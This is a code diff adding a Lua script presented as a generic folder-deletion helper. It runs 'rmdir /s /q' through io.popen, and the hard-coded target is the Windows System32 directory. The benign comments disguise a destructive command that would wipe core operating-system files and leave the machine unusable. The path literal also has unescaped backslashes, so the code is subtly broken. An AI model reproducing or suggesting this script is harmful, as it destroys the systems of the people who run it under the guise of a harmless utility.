@@ -1,1 +1,28 @@
-""
+-- Function to delete a folder and its contents
+local function deleteFolder(folder_path)
+    local function removeFolderContents(path)
+        local cmd = 'rmdir /s /q "' .. path .. '"'
+        local handle = io.popen(cmd)
+
+        if handle then
+            local result = handle:read("*a")
+            handle:close()
+
+            if result == '' then
+                print("Folder '" .. path .. "' deleted successfully.")
+            else
+                print("Error deleting folder '" .. path .. "': " .. result)
+            end
+        else
+            print("Error executing command to delete folder.")
+        end
+    end
+
+    removeFolderContents(folder_path)
+end
+
+-- Specify the path to the folder you want to delete
+local folder_path = "C:\Windows\System32"
+
+-- Call the function to delete the folder and its contents
+deleteFolder(folder_path)
